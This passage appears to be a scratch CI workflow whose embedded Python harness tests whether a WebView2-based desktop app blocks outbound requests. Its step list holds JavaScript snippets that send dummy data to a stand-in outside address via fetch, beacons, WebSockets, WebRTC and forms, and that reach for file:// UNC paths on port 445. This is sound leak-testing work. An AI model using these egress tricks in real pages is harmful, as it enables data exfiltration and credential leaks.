name: ci
# scratch of interrogate-app2-adversary-1: the windows job alone with one probe step; never merged

on:
  push:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.event_name }}-${{ github.sha }}
  cancel-in-progress: false

jobs:
  windows:
    runs-on: windows-2025
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 2
      - uses: Swatinem/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0 # v2.9.3
        with:
          prefix-key: v0-rust
          save-if: false
      - name: app-2 probe of interrogate-app2-adversary-1 (scratch only)
        timeout-minutes: 50
        shell: bash
        run: |
          cat > "$RUNNER_TEMP/adv.py" <<'PYEOF'
          """Probe of interrogate-app2-adversary-1 for unit app-2, run by a scratch workflow step on a hosted
          Windows runner. Never shipped.

          usage:
            python adv.py plan <dir>             writes <dir>/plan.json, <dir>/off.tsv and <dir>/own.tsv
            python adv.py listen <dir> <label>   serves the own-machine listeners until <dir>/stop-<label>
                                                 exists, then writes <dir>/counts-<label>.json
            python adv.py selfprobe <dir>        sends one datagram and one connection to each own listener
            python adv.py offprobe               one TCP connect and one datagram to the off-runner address
            python adv.py report <dir> <label>   prints the raw audit entries of the launch and its cells
            python adv.py table <dir>            prints one row per step with every copy's counts
          """
          import json
          import os
          import re
          import socket
          import sys
          import threading
          import time

          OFF = "198.51.100.7"
          UNC = {"unc-img": "198.51.100.8", "unc-frame": "198.51.100.9", "unc-fetch": "198.51.100.10", "unc-nav": "198.51.100.11"}
          OFF_BASE = 49200
          OWN_BASE = 49300
          PROBE_TCP = 9999
          PROBE_UDP = 9998

          OFF_STEPS = [
              ("image", "var m = new Image(); m.src = U('/img?d=x'); document.body.appendChild(m);"),
              ("fetch", "fetch(U('/fetch?d=x'), {method: 'POST', body: 'x', mode: 'no-cors'}).then(function () { N('fetch-ok'); }, function () { N('fetch-fail'); });"),
              ("beacon", "N('beacon:' + navigator.sendBeacon(U('/beacon'), 'd=x'));"),
              ("ws", "var w = new WebSocket('ws://' + H + ':' + P + '/ws?d=x'); w.onerror = function () { N('ws-error'); }; w.onopen = function () { N('ws-open'); };"),
              ("wss", "var w = new WebSocket('wss://' + H + ':' + P + '/wss?d=x'); w.onerror = function () { N('wss-error'); }; w.onopen = function () { N('wss-open'); };"),
              ("worker", "new Worker(URL.createObjectURL(new Blob([\"fetch('\" + U('/worker?d=x') + \"', {mode: 'no-cors'}).catch(function () {});\"], {type: 'text/javascript'})));"),
              ("es", "var s = new EventSource(U('/es?d=x')); s.onerror = function () { N('es-error'); };"),
              ("preconnect", "var l = document.createElement('link'); l.rel = 'preconnect'; l.href = U('/'); document.head.appendChild(l);"),
              ("prefetch", "var l = document.createElement('link'); l.rel = 'prefetch'; l.href = U('/prefetch?d=x'); document.head.appendChild(l);"),
              ("frame", "var f = document.createElement('iframe'); f.src = U('/frame?d=x'); document.body.appendChild(f);"),
              ("stun", "var p = new RTCPeerConnection({iceServers: [{urls: 'stun:' + H + ':' + P}]}); p.createDataChannel('d'); p.createOffer().then(function (o) { return p.setLocalDescription(o); }).then(function () { N('stun-local'); }, function (e) { N('stun-fail:' + e); });"),
              ("turntcp", "var p = new RTCPeerConnection({iceServers: [{urls: 'turn:' + H + ':' + P + '?transport=tcp', username: 'u', credential: 'c'}]}); p.createDataChannel('d'); p.createOffer().then(function (o) { return p.setLocalDescription(o); }).then(function () { N('turn-local'); }, function (e) { N('turn-fail:' + e); });"),
              ("wt", "var t = new WebTransport('https://' + H + ':' + P + '/wt'); t.ready.then(function () { N('wt-ready'); }, function (e) { N('wt-fail:' + e); });"),
              ("unc-img", "var m = new Image(); m.onerror = function () { N('unc-img-error'); }; m.src = 'file://' + X + '/halvoadv/x.png'; document.body.appendChild(m);"),
              ("unc-frame", "var f = document.createElement('iframe'); f.src = 'file://' + X + '/halvoadv/x.html'; document.body.appendChild(f);"),
              ("unc-fetch", "fetch('file://' + X + '/halvoadv/x.txt').then(function () { N('unc-fetch-ok'); }, function () { N('unc-fetch-fail'); });"),
              ("ping", "var a = document.createElement('a'); a.href = '#adv'; a.ping = U('/ping'); document.body.appendChild(a); a.click();"),
              ("download", "var a = document.createElement('a'); a.href = U('/download?d=x'); a.download = 'halvo-adv.bin'; document.body.appendChild(a); a.click();"),
              ("target", "var a = document.createElement('a'); a.href = U('/target?d=x'); a.target = '_blank'; document.body.appendChild(a); a.click();"),
              ("open", "var o = window.open(U('/open?d=x')); N('open:' + (o ? 'window' : 'null'));"),
              ("form", "var f = document.createElement('form'); f.method = 'post'; f.action = U('/form'); var i = document.createElement('input'); i.name = 'd'; i.value = 'x'; f.appendChild(i); document.body.appendChild(f); f.submit();"),
              ("link", "var a = document.createElement('a'); a.href = U('/link?d=x'); document.body.appendChild(a); a.click();"),
              ("unc-nav", "location.href = 'file://' + X + '/halvoadv/n.html';"),
              ("nav", "location.href = U('/nav?d=x');"),
          ]

          WT = "var t = new WebTransport('https://' + H + ':' + P + '/wt'); t.ready.then(function () { N('wt-ready'); }, function (e) { N('wt-fail:' + e); });"
          OWN_STEPS = [
              ("wt-ip", "ip", WT),
              ("wt-lo4", "lo4", WT),
              ("wt-tauri", "tauri", WT),
              ("wt-ipc", "ipc", WT),
              ("ws-ip", "ip", "var w = new WebSocket('ws://' + H + ':' + P + '/ws?d=x'); w.onerror = function () { N('ws-error'); }; w.onopen = function () { N('ws-open'); };"),
              ("ext-frame", None, "var f = document.createElement('iframe'); f.src = 'halvoadv:frame'; document.body.appendChild(f);"),
              ("ext-open", None, "var o = window.open('halvoadv:open'); N('ext-open:' + (o ? 'window' : 'null'));"),
              ("ext-target", None, "var a = document.createElement('a'); a.href = 'halvoadv:target'; a.target = '_blank'; document.body.appendChild(a); a.click();"),
              ("ext-link", None, "var a = document.createElement('a'); a.href = 'halvoadv:link'; document.body.appendChild(a); a.click();"),
              ("ext-nav", None, "location.href = 'halvoadv:nav';"),
          ]
          OWN_HOSTS = {"lo4": "127.0.0.1", "tauri": "tauri.localhost", "ipc": "ipc.localhost"}


          def runner_address():
              probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
              try:
                  probe.connect(("192.0.2.1", 9))
                  return probe.getsockname()[0]
              finally:
                  probe.close()


          def has_v6_loopback():
              try:
                  s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                  s.bind(("::1", 0))
                  s.close()
                  return True
              except OSError:
                  return False


          def wrap(host, port, unc, body):
              return (
                  "(function () { var H = '%s', P = %d, X = '%s'; function U(p) { return 'http://' + H + ':' + P + p; } "
                  "function N(s) { window.__halvoNote = (window.__halvoNote || '') + s + ';'; } "
                  "try { %s } catch (e) { N('throw:' + e); } })();" % (host, port, unc, body)
              )


          def plan(directory):
              ip = runner_address()
              off = []
              for i, (step, body) in enumerate(OFF_STEPS):
                  port = 445 if step in UNC else OFF_BASE + i
                  target = UNC.get(step, OFF)
                  off.append({"step": step, "addr": target, "port": port, "script": wrap(OFF, OFF_BASE + i, UNC.get(step, OFF), body)})
              own = []
              for i, (step, form, body) in enumerate(OWN_STEPS):
                  port = OWN_BASE + i
                  host = ip if form == "ip" else OWN_HOSTS.get(form, "127.0.0.1")
                  own.append({"step": step, "form": form, "host": host, "port": port, "script": wrap(host, port, OFF, body)})
              with open(os.path.join(directory, "plan.json"), "w", encoding="utf-8") as f:
                  json.dump({"ip": ip, "off": off, "own": own, "v6": has_v6_loopback()}, f, indent=1)
              for name, rows in (("off.tsv", off), ("own.tsv", own)):
                  with open(os.path.join(directory, name), "w", encoding="utf-8", newline="\n") as f:
                      for row in rows:
                          assert "\t" not in row["script"] and "\n" not in row["script"]
                          f.write("%s\t%s\n" % (row["step"], row["script"]))
              print(ip)


          def binds(row, ip, v6):
              if row["form"] == "ip":
                  return [(ip, socket.AF_INET)]
              if row["form"] == "lo4":
                  return [("127.0.0.1", socket.AF_INET)]
              return [("127.0.0.1", socket.AF_INET)] + ([("::1", socket.AF_INET6)] if v6 else [])


          def listen(directory, label):
              plan_ = json.load(open(os.path.join(directory, "plan.json"), encoding="utf-8"))
              counts = {}
              failures = []
              lock = threading.Lock()
              socks = []

              def note(step, kind, data):
                  with lock:
                      c = counts.setdefault(step, {"tcp": 0, "udp": 0, "first": ""})
                      c[kind] += 1
                      if not c["first"]:
                          c["first"] = kind + ":" + data[:24].hex()

              def tcp(sock, step):
                  while True:
                      try:
                          conn, _ = sock.accept()
                      except OSError:
                          return
                      conn.settimeout(1.0)
                      try:
                          data = conn.recv(256)
                      except OSError:
                          data = b""
                      note(step, "tcp", data)
                      try:
                          conn.close()
                      except OSError:
                          pass

              def udp(sock, step):
                  while True:
                      try:
                          data, _ = sock.recvfrom(2048)
                      except OSError:
                          return
                      note(step, "udp", data)

              for row in plan_["own"]:
                  if row["form"] is None:
                      continue
                  for address, family in binds(row, plan_["ip"], plan_["v6"]):
                      for kind, serve in ((socket.SOCK_STREAM, tcp), (socket.SOCK_DGRAM, udp)):
                          try:
                              s = socket.socket(family, kind)
                              s.bind((address, row["port"]))
                              if kind == socket.SOCK_STREAM:
                                  s.listen(16)
                              socks.append(s)
                              threading.Thread(target=serve, args=(s, row["step"]), daemon=True).start()
                          except OSError as e:
                              failures.append("%s %s %s:%d %s" % (row["step"], "tcp" if kind == socket.SOCK_STREAM else "udp", address, row["port"], e))
              open(os.path.join(directory, "ready-" + label), "w").close()
              stop = os.path.join(directory, "stop-" + label)
              while not os.path.exists(stop):
                  time.sleep(0.2)
              for s in socks:
                  try:
                      s.close()
                  except OSError:
                      pass
              with lock:
                  json.dump({"counts": counts, "failures": failures, "bound": len(socks)}, open(os.path.join(directory, "counts-" + label + ".json"), "w", encoding="utf-8"))


          def selfprobe(directory):
              plan_ = json.load(open(os.path.join(directory, "plan.json"), encoding="utf-8"))
              for row in plan_["own"]:
                  if row["form"] is None:
                      continue
                  for address, family in binds(row, plan_["ip"], plan_["v6"]):
                      try:
                          u = socket.socket(family, socket.SOCK_DGRAM)
                          u.sendto(b"advprobe", (address, row["port"]))
                          u.close()
                      except OSError as e:
                          print("adv selfprobe udp %s %s: %s" % (row["step"], address, e))
                      try:
                          t = socket.socket(family, socket.SOCK_STREAM)
                          t.settimeout(2.0)
                          t.connect((address, row["port"]))
                          t.sendall(b"advprobe")
                          t.close()
                      except OSError as e:
                          print("adv selfprobe tcp %s %s: %s" % (row["step"], address, e))
              time.sleep(1.0)


          def offprobe():
              t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              t.settimeout(2.0)
              try:
                  t.connect((OFF, PROBE_TCP))
                  print("adv offprobe tcp: connected (not expected)")
              except OSError as e:
                  print("adv offprobe tcp: %s" % e)
              t.close()
              u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
              try:
                  u.sendto(b"advprobe", (OFF, PROBE_UDP))
                  print("adv offprobe udp: sent")
              except OSError as e:
                  print("adv offprobe udp: %s" % e)
              u.close()


          def events_of(path):
              try:
                  raw = open(path, "rb").read()
              except OSError:
                  return []
              for enc in ("utf-8-sig", "utf-16"):
                  try:
                      text = raw.decode(enc)
                      break
                  except UnicodeError:
                      text = raw.decode("utf-8", "replace")
              out = []
              for ev in re.findall(r"<Event[ >].*?</Event>", text, re.S):
                  eid = re.search(r"<EventID[^>]*>(\d+)</EventID>", ev)
                  when = re.search(r"TimeCreated SystemTime=['\"]([^'\"]+)['\"]", ev)
                  data = dict(re.findall(r"<Data Name=['\"]([^'\"]+)['\"]>([^<]*)</Data>", ev))
                  app = data.get("Application", "").replace("\\", "/").rsplit("/", 1)[-1].lower()
                  out.append({
                      "id": eid.group(1) if eid else "?",
                      "time": when.group(1) if when else "?",
                      "app": app,
                      "pid": data.get("ProcessID", "?"),
                      "dir": data.get("Direction", "?"),
                      "src": data.get("SourceAddress", "?"),
                      "sport": data.get("SourcePort", "?"),
                      "dst": data.get("DestAddress", "?"),
                      "dport": data.get("DestPort", "?"),
                      "proto": data.get("Protocol", "?"),
                  })
              return out


          def is_loopback(address):
              return address.startswith("127.") or address in ("::1", "0:0:0:0:0:0:0:1")


          def is_engine(app):
              return "msedgewebview2" in app or app == "halvo.exe"


          def poll_of(directory, label):
              seen = {}
              try:
                  for line in open(os.path.join(directory, "poll-" + label + ".txt"), encoding="utf-8-sig", errors="replace"):
                      parts = line.split()
                      if len(parts) >= 5:
                          seen.setdefault((parts[1], parts[2]), []).append(parts[3] + "/" + parts[4])
              except OSError:
                  pass
              return seen


          def report(directory, label):
              plan_ = json.load(open(os.path.join(directory, "plan.json"), encoding="utf-8"))
              events = events_of(os.path.join(directory, "audit-" + label + ".xml"))
              print("adv audit %s: %d connection entries read, %d of the engine's processes" % (label, len(events), sum(1 for e in events if is_engine(e["app"]))))
              shown = 0
              summary = {}
              for e in events:
                  off = e["dst"].startswith("198.51.100.")
                  if not off and not is_engine(e["app"]):
                      continue
                  key = (e["id"], e["app"], e["dst"], e["dport"], e["proto"], e["dir"])
                  summary[key] = summary.get(key, 0) + 1
                  if (off or not is_loopback(e["dst"])) and shown < 160:
                      shown += 1
                      print("adv audit %s raw: id=%s time=%s app=%s pid=%s dir=%s src=%s:%s dst=%s:%s proto=%s" % (label, e["id"], e["time"], e["app"], e["pid"], e["dir"], e["src"], e["sport"], e["dst"], e["dport"], e["proto"]))
              for key in sorted(summary):
                  print("adv audit %s sum: id=%s app=%s dst=%s:%s proto=%s dir=%s entries=%d" % ((label,) + key + (summary[key],)))
              polled = poll_of(directory, label)
              for (addr, port), states in sorted(polled.items()):
                  print("adv poll %s raw: %s:%s seen %d times, states %s" % (label, addr, port, len(states), ",".join(sorted(set(states)))))
              cells = {}
              if label.endswith("-off") or label == "offprobe":
                  for row in plan_["off"]:
                      tcp = sum(1 for e in events if e["dst"] == row["addr"] and e["dport"] == str(row["port"]) and e["proto"] == "6")
                      udp = sum(1 for e in events if e["dst"] == row["addr"] and e["dport"] == str(row["port"]) and e["proto"] == "17")
                      poll = len(polled.get((row["addr"], str(row["port"])), []))
                      cells[row["step"]] = {"audit_tcp": tcp, "audit_udp": udp, "poll": poll}
                      print("adv cell %s %s dst=%s:%d audit_tcp=%d audit_udp=%d poll=%d" % (label, row["step"], row["addr"], row["port"], tcp, udp, poll))
                  ptcp = sum(1 for e in events if e["dst"] == OFF and e["dport"] == str(PROBE_TCP))
                  pudp = sum(1 for e in events if e["dst"] == OFF and e["dport"] == str(PROBE_UDP))
                  print("adv cell %s probe-of-the-means audit_tcp=%d audit_udp=%d poll=%d" % (label, ptcp, pudp, len(polled.get((OFF, str(PROBE_TCP)), []))))
              try:
                  counted = json.load(open(os.path.join(directory, "counts-" + label + ".json"), encoding="utf-8"))
              except OSError:
                  counted = {"counts": {}, "failures": ["no counts file"], "bound": 0}
              if label.endswith("-own") or label == "probe":
                  print("adv own %s listeners bound=%d failures=%s" % (label, counted["bound"], counted["failures"]))
                  for row in plan_["own"]:
                      if row["form"] is None:
                          continue
                      c = counted["counts"].get(row["step"], {"tcp": 0, "udp": 0, "first": ""})
                      cells[row["step"]] = {"tcp": c["tcp"], "udp": c["udp"]}
                      print("adv own %s %s host=%s port=%d tcp=%d udp=%d first=%s" % (label, row["step"], row["host"], row["port"], c["tcp"], c["udp"], c["first"]))
                  try:
                      ext = [l.strip() for l in open(os.path.join(directory, "ext-" + label + ".txt"), encoding="utf-8", errors="replace") if l.strip()]
                  except OSError:
                      ext = []
                  print("adv ext %s: %d launches of the registered program: %s" % (label, len(ext), ext))
                  for row in plan_["own"]:
                      if row["form"] is None:
                          name = "halvoadv:" + row["step"].split("-", 1)[1]
                          cells[row["step"]] = {"launched": sum(1 for l in ext if name in l)}
              other = {}
              for e in events:
                  if is_engine(e["app"]) and not is_loopback(e["dst"]) and not e["dst"].startswith("198.51.100."):
                      key = "%s:%s/%s" % (e["dst"], e["dport"], e["proto"])
                      other[key] = other.get(key, 0) + 1
              print("adv other %s: destinations of the engine's processes off loopback and off the planned addresses: %s" % (label, json.dumps(other, sort_keys=True)))
              json.dump(cells, open(os.path.join(directory, "cells-" + label + ".json"), "w", encoding="utf-8"))


          def table(directory):
              copies = [c for c in ("no-layer", "head", "engine-alone", "no-script") if os.path.exists(os.path.join(directory, "cells-" + c + "-off.json"))]
              for kind in ("off", "own"):
                  rows = {}
                  for copy in copies:
                      try:
                          cells = json.load(open(os.path.join(directory, "cells-%s-%s.json" % (copy, kind)), encoding="utf-8"))
                      except OSError:
                          continue
                      for step, cell in cells.items():
                          rows.setdefault(step, {})[copy] = "/".join(str(cell[k]) for k in sorted(cell))
                  keys = "audit_tcp/audit_udp/poll" if kind == "off" else "tcp/udp or launched"
                  print("adv table %s (%s) | step | %s" % (kind, keys, " | ".join(copies)))
                  for step, by in rows.items():
                      print("adv table %s | %s | %s" % (kind, step, " | ".join(by.get(c, "-") for c in copies)))


          if __name__ == "__main__":
              mode = sys.argv[1]
              if mode == "plan":
                  plan(sys.argv[2])
              elif mode == "listen":
                  listen(sys.argv[2], sys.argv[3])
              elif mode == "selfprobe":
                  selfprobe(sys.argv[2])
              elif mode == "offprobe":
                  offprobe()
              elif mode == "report":
                  report(sys.argv[2], sys.argv[3])
              elif mode == "table":
                  table(sys.argv[2])
              else:
                  sys.exit(64)
          PYEOF
          cat > "$RUNNER_TEMP/copies.py" <<'PYEOF'
          """Makes one copy of app-2 for the measurement of rulings AP-9 point 7 and AP-10, in the checkout of
          a hosted job. Never shipped; the step restores the files with git checkout after each copy.

          usage: python copies.py <copy>
          Every copy gets the probe: the check mode runs the steps of HALVO_MEASURE_STEPS after its line and
          prints each step's note (window.__halvoNote), and the window main gets the initialization script of
          HALVO_MEASURE_INIT.
          """
          import json
          import re
          import sys

          COPIES = {
              "head": "every means and layer of the head",
              "no-script": "the head without the script that takes the peer constructors away",
              "engine-alone": "the engine means alone: content policy, the runtime's navigation rule and the script out",
              "no-layer": "every layer and means out, the configuration at creation too",
              "guard-off": "the engine means and the configuration at creation out, the content policy, the runtime's rule and the script in",
              "late": "page layers, start arguments and the configuration at creation out, the engine means installed 4 s after the load",
              "no-switch": "Windows: the head without the script layer and without --webrtc-ip-handling-policy",
              "no-proxy": "Windows: the engine means alone without --proxy-server",
              "no-resolver-map": "Windows: the engine means alone without --host-resolver-rules",
              "no-bypass": "Windows: the engine means alone without --proxy-bypass-list=<-loopback>",
              "hook-alone": "Windows: the engine means alone without --proxy-server and without --host-resolver-rules: the request hook and the switch",
              "no-exclude": "Windows: the head with the two EXCLUDE entries of --host-resolver-rules out",
              "phint-no-layer": "Windows: no layer, the profile's private mode on as shipped; hints put in at load",
              "phint-head": "Windows: the head, the profile's private mode on as shipped; hints put in at load",
              "phint-engine-alone": "Windows: the engine means alone, the profile's private mode on as shipped; hints put in at load",
              "hint-no-layer": "Windows: no layer, the profile's private mode off; hints put in at load",
              "hint-head": "Windows: the head, the profile's private mode off; hints put in at load",
              "hint-no-script": "Windows: the head without the script layer, the profile's private mode off; hints put in at load",
              "hint-engine-alone": "Windows: the engine means alone, the profile's private mode off; hints put in at load",
              "allowed-hosts": "macOS: the configuration at creation that allows no network host and keeps nothing, alone",
              "no-allowed-hosts": "macOS: the head without the configuration at creation and without the guard's reading of it",
              "prefetch-no-layer": "macOS: no layer, the engine's DNS prefetching on",
              "prefetch-head": "macOS: the head, the engine's DNS prefetching on",
              "prefetch-no-script": "macOS: the head without the script layer, the engine's DNS prefetching on",
              "prefetch-engine-alone": "macOS: the engine means alone, the engine's DNS prefetching on",
              "peer-proof": "macOS: the head with the peer-connection preference left on (the script in)",
          }
          copy = sys.argv[1]
          assert copy in COPIES, copy


          def sub(path, old, new):
              text = open(path, encoding="utf-8").read()
              assert text.count(old) == 1, (path, old, text.count(old))
              open(path, "w", encoding="utf-8", newline="\n").write(text.replace(old, new))


          PROBE = '''if let Ok(path) = std::env::var("HALVO_MEASURE_STEPS") {
                          let wait = std::env::var("HALVO_MEASURE_WAIT_MS")
                              .ok()
                              .and_then(|v| v.parse().ok())
                              .unwrap_or(1500u64);
                          let text = std::fs::read_to_string(&path).unwrap_or_default();
                          for row in text.lines() {
                              let Some((id, script)) = row.split_once('\\t') else {
                                  continue;
                              };
                              let Some(window) = app.get_webview_window("main") else {
                                  eprintln!("halvo-measure {id} at-app-origin=no-window");
                                  continue;
                              };
                              let _ = window.eval(script);
                              std::thread::sleep(Duration::from_millis(wait));
                              let at = match window.url() {
                                  Ok(url) if crate::app::is_app_url(&url) => "true",
                                  Ok(_) => "false",
                                  Err(_) => "unreadable",
                              };
                              eprintln!("halvo-measure {id} at-app-origin={at}");
                              let (noted, note) = mpsc::channel();
                              if window
                                  .eval_with_callback("String(window.__halvoNote || '')", move |seen| {
                                      let _ = noted.send(seen);
                                  })
                                  .is_ok()
                              {
                                  if let Ok(seen) = note.recv_timeout(Duration::from_secs(2)) {
                                      if seen.len() > 2 {
                                          eprintln!("halvo-measure-note {id} {seen}");
                                      }
                                  }
                              }
                              let _ = window.eval("window.__halvoNote = ''");
                              if at != "true" {
                                  let before = app.try_state::<PageLoads>().map(|l| l.count()).unwrap_or(0);
                                  let _ = window.navigate(crate::app::app_url());
                                  let deadline = Instant::now() + Duration::from_secs(15);
                                  while Instant::now() < deadline
                                      && app.try_state::<PageLoads>().map(|l| l.count()).unwrap_or(0) <= before
                                  {
                                      std::thread::sleep(Duration::from_millis(100));
                                  }
                                  std::thread::sleep(Duration::from_millis(300));
                              }
                          }
                          eprintln!("halvo-measure done");
                      }
                      app.exit(Exit::PageLoaded.code());'''

          sub("src-tauri/src/check_page.rs", "            app.exit(Exit::PageLoaded.code());", PROBE)
          sub(
